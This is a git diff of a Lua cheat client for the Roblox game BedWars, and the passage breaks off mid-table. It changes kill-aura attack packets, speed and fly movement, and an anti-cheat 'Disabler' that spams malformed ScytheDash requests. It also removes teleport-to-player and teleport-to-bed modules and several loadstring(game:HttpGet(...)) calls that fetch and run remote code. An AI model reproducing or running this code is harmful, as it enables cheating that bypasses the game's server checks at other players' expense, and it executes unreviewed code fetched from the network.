@@ -1,4 +1,3 @@
---This watermark is used to delete the file if its cached, remove it to make the file persist after commits.
 local GuiLibrary = shared.GuiLibrary
 local playersService = game:GetService("Players")
 local textService = game:GetService("TextService")
@@ -47,6 +46,7 @@ local bedwarsStore = {
 	matchStateChanged = tick(),
 	pots = {},
 	queueType = "bedwars_test",
+	scythe = tick(),
 	statistics = {
 		beds = 0,
 		kills = 0,
@@ -208,12 +208,12 @@ local function predictGravity(playerPosition, vel, bulletTime, targetPart, Gravi
 	local velocityCheck = (tick() - targetPart.JumpTick) < 0.2
 	vel = vel * physicsUpdate
 
-	for i = 1, math.round(bulletTime / physicsUpdate) do 
+	for i = 1, math.ceil(bulletTime / physicsUpdate) do 
 		if velocityCheck then 
 			estimatedVelocity = estimatedVelocity - (Gravity * physicsUpdate)
 		else
 			estimatedVelocity = 0
-			playerPosition = playerPosition + Vector3.new(0, -0.03, 0) -- bw hitreg is so bad that I have to add this LOL
+			playerPosition = playerPosition + Vector3.new(0, -0.03, 0)
 			rootSize = rootSize - 0.03
 		end
 
@@ -386,16 +386,16 @@ local function attackValue(vec)
 end
 
 local function getSpeed()
-	local speed = 20
+	local speed = 0
 	if lplr.Character then 
 		local SpeedDamageBoost = lplr.Character:GetAttribute("SpeedBoost")
 		if SpeedDamageBoost and SpeedDamageBoost > 1 then 
-			speed = speed + (22 * (SpeedDamageBoost - 1))
+			speed = speed + (8 * (SpeedDamageBoost - 1))
 		end
 		if bedwarsStore.grapple > tick() then
 			speed = speed + 90
 		end
-		if lplr.Character:GetAttribute("SpeedPieBuff") then 
+		if bedwarsStore.scythe > tick() then 
 			speed = speed + 5
 		end
 		if lplr.Character:GetAttribute("GrimReaperChannel") then 
@@ -404,10 +404,10 @@ local function getSpeed()
 		local armor = bedwarsStore.localInventory.inventory.armor[3]
 		if type(armor) ~= "table" then armor = {itemType = ""} end
 		if armor.itemType == "speed_boots" then 
-			speed = speed + 25
+			speed = speed + 12
 		end
 		if bedwarsStore.zephyrOrb ~= 0 then 
-			speed = speed + 28
+			speed = speed + 12
 		end
 	end
 	return speed
@@ -640,7 +640,7 @@ local function EntityNearPosition(distance, ignore, overridepos)
 					if overridepos and mag > distance then 
 						mag = (overridepos - v.PrimaryPart.Position).magnitude
 					end
-					if mag <= closestMagnitude then -- magcheck
+					if mag <= closestMagnitude then
 						closestEntity, closestMagnitude = {Player = {Name = "Drone", UserId = 1443379645}, Character = v, RootPart = v.PrimaryPart, JumpTick = tick() + 5, Jumping = false, Humanoid = {HipHeight = 2}}, mag
 					end
 				end
@@ -757,7 +757,6 @@ local function AllNearPosition(distance, amount, sortfunction, prediction)
 	return returnedplayer
 end
 
---pasted from old source since gui code is hard
 local function CreateAutoHotbarGUI(children2, argstable)
 	local buttonapi = {}
 	buttonapi["Hotbars"] = {}
@@ -1323,6 +1322,7 @@ runFunction(function()
 		ResetRemote = dumpRemote(debug.getconstants(debug.getproto(KnitClient.Controllers.ResetController.createBindable, 1))),
 		Roact = require(replicatedStorageService["rbxts_include"]["node_modules"]["@rbxts"]["roact"].src),
 		RuntimeLib = require(replicatedStorageService["rbxts_include"].RuntimeLib),
+		ScytheController = KnitClient.Controllers.ScytheController,
 		Shop = require(replicatedStorageService.TS.games.bedwars.shop["bedwars-shop"]).BedwarsShop,
 		ShopItems = debug.getupvalue(debug.getupvalue(require(replicatedStorageService.TS.games.bedwars.shop["bedwars-shop"]).BedwarsShop.getShopItem, 1), 2),
 		SoundList = require(replicatedStorageService.TS.sound["game-sound"]).GameSound,
@@ -2237,7 +2237,7 @@ do
 	end)
 	local textlabel = Instance.new("TextLabel")
 	textlabel.Size = UDim2.new(1, 0, 0, 36)
-	textlabel.Text = "Config Created By The Snoopy Configs Team, Have Fun Using The Config!"
+	textlabel.Text = ""
 	textlabel.BackgroundTransparency = 1
 	textlabel.ZIndex = 10
 	textlabel.TextStrokeTransparency = 0
@@ -3030,10 +3030,10 @@ runFunction(function()
 							lastonground = true
 						end
 
-						local flyVelocity = entityLibrary.character.Humanoid.MoveDirection * (FlyMode.Value == "Normal" and FlySpeed.Value or getSpeed())
+						local flyVelocity = entityLibrary.character.Humanoid.MoveDirection * (FlyMode.Value == "Normal" and FlySpeed.Value or 20)
 						entityLibrary.character.HumanoidRootPart.Velocity = flyVelocity + (Vector3.new(0, playerMass + (FlyUp and FlyVerticalSpeed.Value or 0) + (FlyDown and -FlyVerticalSpeed.Value or 0), 0))
 						if FlyMode.Value ~= "Normal" then
-							entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + (entityLibrary.character.Humanoid.MoveDirection * (FlySpeed.Value - 20)) * delta
+							entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + (entityLibrary.character.Humanoid.MoveDirection * ((FlySpeed.Value + getSpeed()) - 20)) * delta
 						end
 					end
 				end)
@@ -3205,7 +3205,6 @@ runFunction(function()
 	local alternatelist = {"Normal", "AntiCheat A", "AntiCheat B"}
 	local projectileRemote = bedwars.ClientHandler:Get(bedwars.ProjectileRemote)
 
-	--me when I have to fix bw code omegalol
 	bedwars.ClientHandler:Get("GrapplingHookFunctions"):Connect(function(p4)
 		if p4.hookFunction == "PLAYER_IN_TRANSIT" then
 			bedwars.CooldownController:setOnCooldown("grappling_hook", 3.5)
@@ -3412,10 +3411,10 @@ runFunction(function()
 						if isnetworkowner(oldcloneroot) then 
 							local playerMass = (entityLibrary.character.HumanoidRootPart:GetMass() - 1.4) * (delta * 100)
 							
-							local flyVelocity = entityLibrary.character.Humanoid.MoveDirection * (InfiniteFlyMode.Value == "Normal" and InfiniteFlySpeed.Value or getSpeed())
+							local flyVelocity = entityLibrary.character.Humanoid.MoveDirection * (InfiniteFlyMode.Value == "Normal" and InfiniteFlySpeed.Value or 20)
 							entityLibrary.character.HumanoidRootPart.Velocity = flyVelocity + (Vector3.new(0, playerMass + (InfiniteFlyUp and InfiniteFlyVerticalSpeed.Value or 0) + (InfiniteFlyDown and -InfiniteFlyVerticalSpeed.Value or 0), 0))
 							if InfiniteFlyMode.Value ~= "Normal" then
-								entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + (entityLibrary.character.Humanoid.MoveDirection * (InfiniteFlySpeed.Value - 20)) * delta
+								entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + (entityLibrary.character.Humanoid.MoveDirection * ((InfiniteFlySpeed.Value + getSpeed()) - 20)) * delta
 							end
 
 							local speedCFrame = {oldcloneroot.CFrame:GetComponents()}
@@ -3623,24 +3622,6 @@ runFunction(function()
 		Exhibition = {
 			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.1},
 			{CFrame = CFrame.new(0.7, -0.71, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.2}
-		},
-		["CustomSP+"] = {
-			{CFrame = CFrame.new(0.39, 1, 0.2) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.13},
-			{CFrame = CFrame.new(0.39, 1, 0.2) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.03},
-			{CFrame = CFrame.new(0.7, 0.1, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.09},
-			{CFrame = CFrame.new(0.7, 0.1, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.05},
-			{CFrame = CFrame.new(0.39, 0.1, 1.37) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.13}
-		},
-		["Astral"] = {
-			{CFrame = CFrame.new(0.7, -0.7, 0.6) * CFrame.Angles(math.rad(-16), math.rad(60), math.rad(-80)), Time = 0.1},
-			{CFrame = CFrame.new(0.7, -0.7, 0.6) * CFrame.Angles(math.rad(-16), math.rad(60), math.rad(-80)), Time = 0.15},
-			{CFrame = CFrame.new(0.95, -1.06, -2.25) * CFrame.Angles(math.rad(-179), math.rad(61), math.rad(80)), Time = 0.15}
-		},
-		NewCatV5 = {
-			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(-65), math.rad(55), math.rad(-70)), Time = 0.1},
-			{CFrame = CFrame.new(0.69, -0.71, 0.6) * CFrame.Angles(math.rad(-160), math.rad(60), math.rad(1)), Time = 0.1},
-			{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(-0), math.rad(0), math.rad(-0)), Time = -0.2},
-			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(-22), math.rad(56), math.rad(-106)), Time = 0.1}
 		},
 		["Exhibition Old"] = {
 			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.15},
@@ -3852,12 +3833,13 @@ runFunction(function()
 											},
 											Player = plr.Player
 										}
-										if not killaurasync.Enabled then 
-											if animationdelay <= tick() then
-												animationdelay = tick() + 0.19
-												if not killauraswing.Enabled then 
-													bedwars.SwordController:playSwordEffect(swordmeta)
-												end
+										if animationdelay <= tick() then
+											animationdelay = tick() + (swordmeta.sword.respectAttackSpeedForEffects and swordmeta.sword.attackSpeed or (killaurasync.Enabled and 0.24 or 0.14))
+											if not killauraswing.Enabled then 
+												bedwars.SwordController:playSwordEffect(swordmeta, false)
+											end
+											if swordmeta.displayName:find(" Scythe") then 
+												bedwars.ScytheController:playLocalAnimation()
 											end
 										end
 									end
@@ -3865,20 +3847,12 @@ runFunction(function()
 										break
 									end
 									local selfpos = selfrootpos + (killaurarange.Value > 14 and (selfrootpos - root.Position).magnitude > 14.4 and (CFrame.lookAt(selfrootpos, root.Position).lookVector * ((selfrootpos - root.Position).magnitude - 14)) or Vector3.zero)
-									if killaurasync.Enabled then 
-										if animationdelay <= tick() then
-											animationdelay = tick() + 0.19
-											if not killauraswing.Enabled then 
-												bedwars.SwordController:playSwordEffect(swordmeta)
-											end
-										end
-									end
 									bedwars.SwordController.lastAttack = workspace:GetServerTimeNow()
 									bedwarsStore.attackReach = math.floor((selfrootpos - root.Position).magnitude * 100) / 100
 									bedwarsStore.attackReachUpdate = tick() + 1
 									killaurarealremote:FireServer({
 										weapon = sword.tool,
-										chargedAttack = {chargeRatio = swordmeta.sword.chargedAttack and not swordmeta.sword.chargedAttack.disableOnGrounded and 1 or 0},
+										chargedAttack = {chargeRatio = swordmeta.sword.chargedAttack and not swordmeta.sword.chargedAttack.disableOnGrounded and 0.999 or 0},
 										entityInstance = plr.Character,
 										validate = {
 											raycast = {
@@ -4482,9 +4456,9 @@ runFunction(function()
 									directionvec = entityLibrary.character.HumanoidRootPart.CFrame.lookVector
 								end
 								local longJumpCFrame = Vector3.new(directionvec.X, 0, directionvec.Z)
-								local newvelo = longJumpCFrame.Unit == longJumpCFrame.Unit and longJumpCFrame.Unit * (newnum > 1 and damagetimer or getSpeed()) or Vector3.zero
+								local newvelo = longJumpCFrame.Unit == longJumpCFrame.Unit and longJumpCFrame.Unit * (newnum > 1 and damagetimer or 20) or Vector3.zero
 								newvelo = Vector3.new(newvelo.X, 0, newvelo.Z)
-								longJumpCFrame = longJumpCFrame * 3 * dt
+								longJumpCFrame = longJumpCFrame * (getSpeed() + 3) * dt
 								local ray = workspace:Raycast(entityLibrary.character.HumanoidRootPart.Position, longJumpCFrame, bedwarsStore.blockRaycast)
 								if ray then 
 									longJumpCFrame = Vector3.zero
@@ -4717,8 +4691,6 @@ runFunction(function()
 		Default = true
 	})
 end)
-
---until I find a way to make the spam switch item thing not bad I'll just get rid of it, sorry.
 
 local Scaffold = {Enabled = false}
 runFunction(function()
@@ -4968,13 +4940,13 @@ runFunction(function()
 							end
 						end
 
-						local speedValue = getSpeed()
+						local speedValue = SpeedValue.Value + getSpeed()
 						if damagetick > tick() then speedValue = speedValue + 20 end
 
-						local speedVelocity = entityLibrary.character.Humanoid.MoveDirection * (SpeedMode.Value == "Normal" and SpeedValue.Value or speedValue)
+						local speedVelocity = entityLibrary.character.Humanoid.MoveDirection * (SpeedMode.Value == "Normal" and SpeedValue.Value or 20)
 						entityLibrary.character.HumanoidRootPart.Velocity = antivoidvelo or Vector3.new(speedVelocity.X, entityLibrary.character.HumanoidRootPart.Velocity.Y, speedVelocity.Z)
 						if SpeedMode.Value ~= "Normal" then 
-							local speedCFrame = entityLibrary.character.Humanoid.MoveDirection * (SpeedValue.Value - 20) * delta
+							local speedCFrame = entityLibrary.character.Humanoid.MoveDirection * (speedValue - 20) * delta
 							raycastparameters.FilterDescendantsInstances = {lplr.Character}
 							local ray = workspace:Raycast(entityLibrary.character.HumanoidRootPart.Position, speedCFrame, raycastparameters)
 							if ray then speedCFrame = (ray.Position - entityLibrary.character.HumanoidRootPart.Position) end
@@ -5183,7 +5155,7 @@ runFunction(function()
 								local localPos = CFrame.new(plr.RootPart.Position)
 								local ray = workspace:Blockcast(localPos, Vector3.new(3, 3, 3), CFrame.Angles(0, math.rad(ang), 0).lookVector * TargetStrafeRange.Value, bedwarsStore.blockRaycast)
 								local newPos = localPos + (CFrame.Angles(0, math.rad(ang), 0).lookVector * (ray and ray.Distance - 1 or TargetStrafeRange.Value))
-								local factor = getSpeed() > 20 and 6 or 4
+								local factor = getSpeed() > 0 and 6 or 4
 								if not workspace:Raycast(newPos.p, Vector3.new(0, -70, 0), bedwarsStore.blockRaycast) then 
 									newPos = localPos
 									factor = 40
@@ -5696,7 +5668,6 @@ runFunction(function()
 					debug.setupvalue(bedwars.SwordController.swingSwordAtMouse, 4, bedwars.QueryUtil)
 				end
 				debug.setconstant(bedwars.QueueCard.render, 9, 0.1)
-				UserSettings():GetService("UserGameSettings").RotationType = ((gameCamera.CFrame.Position - gameCamera.Focus.Position).Magnitude <= 0.5 and Enum.RotationType.CameraRelative or Enum.RotationType.MovementRelative)
 			else
 				if GameFixerHit.Enabled then 
 					debug.setconstant(bedwars.SwordController.swingSwordAtMouse, 23, "Raycast")
@@ -9309,9 +9280,9 @@ runFunction(function()
 												local hori1 = Vector3.new(entityLibrary.character.HumanoidRootPart.Position.X, 0, entityLibrary.character.HumanoidRootPart.Position.Z)
 												local hori2 = Vector3.new(pos.X, 0, pos.Z)
 												local newpos = (hori2 - hori1).Unit
-												local realnewpos = CFrame.new(newpos == newpos and entityLibrary.character.HumanoidRootPart.CFrame.p + (newpos * (3 * dt)) or Vector3.zero)
+												local realnewpos = CFrame.new(newpos == newpos and entityLibrary.character.HumanoidRootPart.CFrame.p + (newpos * ((3 + getSpeed()) * dt)) or Vector3.zero)
 												entityLibrary.character.HumanoidRootPart.CFrame = CFrame.new(realnewpos.p.X, pos.Y, realnewpos.p.Z)
-												antivoidvelo = newpos == newpos and newpos * (20 + getSpeed()) or Vector3.zero
+												antivoidvelo = newpos == newpos and newpos * 20 or Vector3.zero
 												entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(antivoidvelo.X, entityLibrary.character.HumanoidRootPart.Velocity.Y, antivoidvelo.Z)
 												if getPlacedBlock((entityLibrary.character.HumanoidRootPart.CFrame.p - Vector3.new(0, 1, 0)) + entityLibrary.character.HumanoidRootPart.Velocity.Unit) or getPlacedBlock(entityLibrary.character.HumanoidRootPart.CFrame.p + Vector3.new(0, 3)) then
 													pos = pos + Vector3.new(0, 1, 0)
@@ -10011,10 +9982,13 @@ runFunction(function()
             if callback then 
 				task.spawn(function()
 					repeat
-						task.wait(0.03)
+						task.wait()
 						local item = getItemNear("scythe")
-						if item and lplr.Character.HandInvItem.Value == item.tool then 
+						if item and lplr.Character.HandInvItem.Value == item.tool and bedwars.CombatController then 
 							bedwars.ClientHandler:Get("ScytheDash"):SendToServer({direction = Vector3.new(9e9, 9e9, 9e9)})
+							if entityLibrary.isAlive and entityLibrary.character.Head.Transparency ~= 0 then
+								bedwarsStore.scythe = tick() + 1
+							end
 						end
 					until (not Disabler.Enabled)
 				end)
@@ -10428,1535 +10402,668 @@ task.spawn(function()
 		AutoLeave.ToggleButton(false)
 	end
 end)
-runFunction(function()
-	local hasTeleported = false
-	local TweenService = game:GetService("TweenService")
 
-	function findNearestPlayer()
-		local nearestPlayer = nil
-		local minDistance = math.huge
-
-		for _,v in pairs(game.Players:GetPlayers()) do
-			if v ~= lplr and v.Character and v.Character:FindFirstChild("HumanoidRootPart") and v.Team ~= lplr.Team and v.Character:FindFirstChild("Humanoid").Health > 0 then
-				local distance = (v.Character.HumanoidRootPart.Position - lplr.Character.HumanoidRootPart.Position).magnitude
-				if distance < minDistance then
-					nearestPlayer = v
-					minDistance = distance
-				end
-			end
+	runFunction(function()
+		local KillFeed = {["Enabled"] = false}
+		local container
+		
+		KillFeed = GuiLibrary["ObjectsThatCanBeSaved"]["RenderWindow"]["Api"].CreateOptionsButton({
+		["Name"] = "NoFeed",
+		["Function"] = function(callback)
+		if callback then
+		   task.spawn(function()
+		   if container == nil then
+			  repeat
+				 local suc, res = pcall(function() return lplr.PlayerGui.KillFeedGui.KillFeedContainer end)
+				 if suc then
+					container = res
+				 end
+				 task.wait()
+			  until container ~= nil
+		   end
+		   container.Visible = false
+		   end)
+		else
+		   if container then
+			  container.Visible = true
+		   end
 		end
-		return nearestPlayer
-	end
-
-
-	function tweenToNearestPlayer()
-		local nearestPlayer = findNearestPlayer()
-		if nearestPlayer and not hasTeleported then
-			hasTeleported = true
-
-			local tweenInfo = TweenInfo.new(0, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0)
-
-			local tween = TweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.64), {CFrame = nearestPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 2, 0)})
-			tween:Play()
 		end
-	end
-
-	PlayerTp = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
-		Name = "PlayerTP",
-		Function = function(callback)
-			if callback then
-				lplr.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
-				lplr.CharacterAdded:Connect(function()
-					wait(0.3)
-					tweenToNearestPlayer()
-				end)
-				hasTeleported = false
-				PlayerTp["ToggleButton"](false)
-			end
-		end,
-		["HoverText"] = "Teleports you to the closest player that is not on your team (BETA)"
-	})
-end)
-runFunction(function()
-	local hasTeleported = false
-	local TweenService = game:GetService("TweenService")
-
-	function findNearestBed()
-		local nearestBed = nil
-		local minDistance = math.huge
-
-		for _,v in pairs(game.Workspace:GetDescendants()) do
-			if v.Name:lower() == "bed" and v:FindFirstChild("Covers") and v:FindFirstChild("Covers").BrickColor ~= lplr.Team.TeamColor then
-				local distance = (v.Position - lplr.Character.HumanoidRootPart.Position).magnitude
-				if distance < minDistance then
-					nearestBed = v
-					minDistance = distance
-				end
-			end
-		end
-		return nearestBed
-	end
-	function tweenToNearestBed()
-		local nearestBed = findNearestBed()
-		if nearestBed and not hasTeleported then
-			hasTeleported = true
-
-			local tweenInfo = TweenInfo.new(0, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0)
-
-			local tween = TweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.64), {CFrame = nearestBed.CFrame + Vector3.new(0, 2, 0)})
-			tween:Play()
-		end
-	end
-	BedTp = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
-		Name = "BedTp",
-		Function = function(callback)
-			if callback then
-				lplr.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
-				lplr.CharacterAdded:Connect(function()
-					wait(0.3) 
-					tweenToNearestBed()
-				end)
-				hasTeleported = false
-				BedTp["ToggleButton"](false)
-			end
-		end,
-		["HoverText"] = "Tp To Closest Bed | Works in 30v30 😱"
-	})
-end)
-runFunction(function()
-	InfiniteJump = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
-		Name = "InfiniteJump",
-		Function = function(callback)
-			if callback then
-
-			end
-		end
-	})
-	game:GetService("UserInputService").JumpRequest:Connect(function()
-		if not InfiniteJump.Enabled then return end
-		local localPlayer = game:GetService("Players").LocalPlayer
-		local character = localPlayer.Character
-		if character and character:FindFirstChildOfClass("Humanoid") then
-			local humanoid = character:FindFirstChildOfClass("Humanoid")
-			humanoid:ChangeState("Jumping")
-		end
-	end)         
-end)
-runFunction(function()
-	FPSUnlocker = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
-		Name = "FPSUnlocker",
-		Function = function(callback)
-			if callback then
-				setfpscap(99999999999999999999)
-			end
-		end
-	})
-end)
-local skidDetected = {}
-runFunction(function()
-    SkidDetector = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
-        Name = "SkidDetector",
-        Function = function(callback)
-            if callback then
-				repeat task.wait() until game:IsLoaded()
-                local words = {
-                    "LoveCleint",
-                    "Love Client",
-                    "ware",
-                    "kingware",
-                    "ColdClient",
-                    "COLD CLIENT",
-                    "client",
-                    "privet",
-                    "privete",
-                    "pistonware",
-                    "themagicpiston"   
-                }
-
-                for i, v in pairs(game:GetService("Players"):GetChildren()) do
-                    v.Chatted:Connect(function(msg)
-                        for _, word in ipairs(words) do
-                            if string.find(string.lower(msg), string.lower(word)) and not skidDetected[v.Name] then
-                                skidDetected[v.Name] = true
-                                warningNotification("Skid Detector", v.Name.." is a likely skid!", 100) 
-                                break
-                            end
-                        end
-                    end)
-                end
-            end
-        end
-    })
-end)
-local function lerpColor(color1, color2, t)
-    return Color3.new(
-        color1.r + (color2.r - color1.r) * t,
-        color1.g + (color2.g - color1.g) * t,
-        color1.b + (color2.b - color1.b) * t
-    )
-end
-
-local function fadeColors(color1, color2, duration)
-    local startTime = tick()
-    while true do
-        local elapsedTime = tick() - startTime
-        local t = math.abs(math.sin(elapsedTime / duration))
-        highlight2.FillColor = lerpColor(color1, color2, t)
-        wait()
-    end
-end
-
-runFunction(function()
-    EnchantedSwordEffect = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
-        Name = "EnchantedSwordEffect",
-        Function = function(callback)
-            if callback then 
-                spawn(function()
-                    local cam = game.Workspace.CurrentCamera
-                    Connection = cam.Viewmodel.ChildAdded:Connect(function(v)
-                        highlight2 = Instance.new('Highlight')
-                        highlight2.Parent = v.Handle
-                        if v:FindFirstChild("Handle") then
-                            pcall(function()
-                                highlight2.FillTransparency = .45
-								highlight2.OutlineTransparency = 1
-                                fadeColors(Color3.fromRGB(137, 207, 240), Color3.fromRGB(221, 193, 255), 1.5)
-                            end)
-                        end
-                    end)
-                    spawn(function()
-                        repeat task.wait() until unejected == true 
-                        EnabledOutlines = false
-                        if Connection ~= nil then
-                            if type(Connection) == "userdata" then
-                                Connection:Disconnect()
-                                Connection = nil
-                            end
-                        end
-                    end)
-                end)
-            else
-                EnabledOutlines = false
-                if Connection ~= nil then
-                    if type(Connection) == "userdata" then
-                        Connection:Disconnect()
-                        Connection = nil
-                    end
-                end
-            end
-        end
-    })
-end)
-runFunction(function()
-	CustomKeystokes = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
-		Name = "CustomKeystokes",
-		Function = function(callback)
-			if callback then 
-				loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/Keystrokes"))()
-			end
-		end
-	})
-end)
-runFunction(function()
-	local transformed = false
-	local TexturePacks = {["Enabled"] = false}
-	local packselected = {["Value"] = "OldBedwars"}
-
-	local packfunctions = {
-		SeventhPack = function() 
-			task.spawn(function()
-				loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/TexturePacks/main/Pack%237"))()  
-			end)
-		end,
-		EighthPack = function() 
-			task.spawn(function()
-				loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/TexturePacks/main/1024xPack"))()  
-			end)
-		end,
-		SixthPack = function() 
-			task.spawn(function()
-				loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/TexturePacks/main/Pack%236"))()  
-			end)
-		end,
-		FifthPack = function() 
-			task.spawn(function()
-				loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/TexturePacks/main/Pack%235"))()  
-			end)
-		end,
-		FourthPack = function() 
-			task.spawn(function()
-				loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/TexturePacks/main/Pack%234"))()  
-			end)
-		end,
-		ThirdPack = function() 
-			task.spawn(function()
-				loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/TexturePack"))()  
-			end)
-		end,
-		SecondPack = function() 
-			task.spawn(function()
-				loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/TexturePacks/main/Pack%232"))()  
-			end)
-		end,
-		FirstPack = function() 
-			task.spawn(function()
-				loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/TexturePacks/main/Pack%231"))()  
-			end)
-		end,
-		CottonCandy = function() 
-			task.spawn(function() 
-				loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/TexturePacks/main/CottonCandy256x"))()           
-			end)
-		end,
-		EgirlPack = function() 
-			task.spawn(function() 	
-				loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/TexturePacks/main/E-Girl"))()  		             
-			end)
-		end,
-		GlizzyPack = function() 
-			task.spawn(function()
-				loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/TexturePacks/main/Glizzy"))()   
-			end)
-        end,
-		PrivatePack = function() 
-			task.spawn(function()
-				local Players = game:GetService("Players")
-				local ReplicatedStorage = game:GetService("ReplicatedStorage")
-				local Workspace = game:GetService("Workspace")
-				local objs = game:GetObjects("rbxassetid://14161283331")
-				local import = objs[1]
-				import.Parent = ReplicatedStorage
-				local index = {
-					{
-						name = "wood_sword",
-						offset = CFrame.Angles(math.rad(0), math.rad(-89), math.rad(-90)),
-						model = import:WaitForChild("Wood_Sword"),
-					},	
-					{
-						name = "stone_sword",
-						offset = CFrame.Angles(math.rad(0), math.rad(-89), math.rad(-90)),
-						model = import:WaitForChild("Stone_Sword"),
-					},
-					{
-						name = "iron_sword",
-						offset = CFrame.Angles(math.rad(0), math.rad(-89), math.rad(-90)),
-						model = import:WaitForChild("Iron_Sword"),
-					},
-					{
-						name = "diamond_sword",
-						offset = CFrame.Angles(math.rad(0), math.rad(-89), math.rad(-90)),
-						model = import:WaitForChild("Diamond_Sword"),
-					},
-					{
-						name = "emerald_sword",
-						offset = CFrame.Angles(math.rad(0), math.rad(-89), math.rad(-90)),
-						model = import:WaitForChild("Emerald_Sword"),
-					},
-					{
-						name = "rageblade",
-						offset = CFrame.Angles(math.rad(0),math.rad(-100),math.rad(90)),
-						model = import:WaitForChild("Rageblade"),
-					}, 
-					{
-						name = "wood_pickaxe",
-						offset = CFrame.Angles(math.rad(0), math.rad(-180), math.rad(-95)),
-						model = import:WaitForChild("Wood_Pickaxe"),
-					},
-					{
-						name = "stone_pickaxe",
-						offset = CFrame.Angles(math.rad(0), math.rad(-180), math.rad(-95)),
-						model = import:WaitForChild("Stone_Pickaxe"),
-					},
-					{
-						name = "iron_pickaxe",
-						offset = CFrame.Angles(math.rad(0), math.rad(-18033), math.rad(-95)),
-						model = import:WaitForChild("Iron_Pickaxe"),
-					},
-					{
-						name = "diamond_pickaxe",
-						offset = CFrame.Angles(math.rad(0), math.rad(80), math.rad(-95)),
-						model = import:WaitForChild("Diamond_Pickaxe"),
-					},	
-					{
-						name = "wood_axe",
-						offset = CFrame.Angles(math.rad(0), math.rad(-10), math.rad(-95)),
-						model = import:WaitForChild("Wood_Axe"),
-					},	
-					{
-						name = "stone_axe",
-						offset = CFrame.Angles(math.rad(0), math.rad(-10), math.rad(-95)),
-						model = import:WaitForChild("Stone_Axe"),
-					},	
-					{
-						name = "iron_axe",
-						offset = CFrame.Angles(math.rad(0), math.rad(-10), math.rad(-95)),
-						model = import:WaitForChild("Iron_Axe"),
-					},	
-					{
-						name = "diamond_axe",
-						offset = CFrame.Angles(math.rad(0), math.rad(-89), math.rad(-95)),
-						model = import:WaitForChild("Diamond_Axe"),
-					},	
-					{
-						name = "fireball",
-						offset = CFrame.Angles(math.rad(0), math.rad(-90), math.rad(90)),
-						model = import:WaitForChild("Fireball"),
-					},	
-					{
-						name = "telepearl",
-						offset = CFrame.Angles(math.rad(0), math.rad(-90), math.rad(90)),
-						model = import:WaitForChild("Telepearl"),
-					},
-					{
-						name = "diamond",
-						offset = CFrame.Angles(math.rad(0), math.rad(-90), math.rad(90)),
-						model = import:WaitForChild("Diamond"),
-					},
-					{
-						name = "iron",
-						offset = CFrame.Angles(math.rad(0), math.rad(-90), math.rad(90)),
-						model = import:WaitForChild("Iron"),
-					},
-					{
-						name = "gold",
-						offset = CFrame.Angles(math.rad(0), math.rad(-90), math.rad(90)),
-						model = import:WaitForChild("Gold"),
-					},
-					{
-						name = "emerald",
-						offset = CFrame.Angles(math.rad(0), math.rad(-90), math.rad(90)),
-						model = import:WaitForChild("Emerald"),
-					},
-					{
-						name = "wood_bow",
-						offset = CFrame.Angles(math.rad(0), math.rad(0), math.rad(90)),
-						model = import:WaitForChild("Bow"),
-					},
-					{
-						name = "wood_crossbow",
-						offset = CFrame.Angles(math.rad(0), math.rad(0), math.rad(90)),
-						model = import:WaitForChild("Bow"),
-					},
-					{
-						name = "tactical_crossbow",
-						offset = CFrame.Angles(math.rad(0), math.rad(180), math.rad(-90)),
-						model = import:WaitForChild("Bow"),
-					},
-				}
-				local func = Workspace.Camera.Viewmodel.ChildAdded:Connect(function(tool)	
-					if not tool:IsA("Accessory") then return end	
